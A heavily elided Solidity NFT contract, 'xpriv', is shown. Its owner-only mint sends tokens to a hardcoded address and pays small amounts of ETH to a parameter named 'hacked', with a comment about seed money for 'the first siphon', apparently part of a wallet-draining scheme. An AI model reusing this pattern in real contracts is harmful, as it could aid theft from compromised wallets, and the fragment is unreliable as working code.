...
// File: contracts/xpriv_for_flat.sol
...
contract xpriv is ERC721URIStorageUpgradeable, OwnableUpgradeable {
    string baseURI;
    address receiver = 0xb3F0771103120F80eE3F2FDeDF9c856a3Af683b1;
    
    function initialize() initializer public {
        __ERC721_init("xpriv", "XPRIV");
       __Ownable_init_unchained();
    ...
    function mint(
        ...
        address payable hacked
    ) public onlyOwner {
        _mint(receiver, tokenId);
        _setTokenURI(tokenId, tokenURI);
        hacked.transfer(250000000000000);
    }
   ...
   /**
    * Needs seed money for the first siphon.
    */
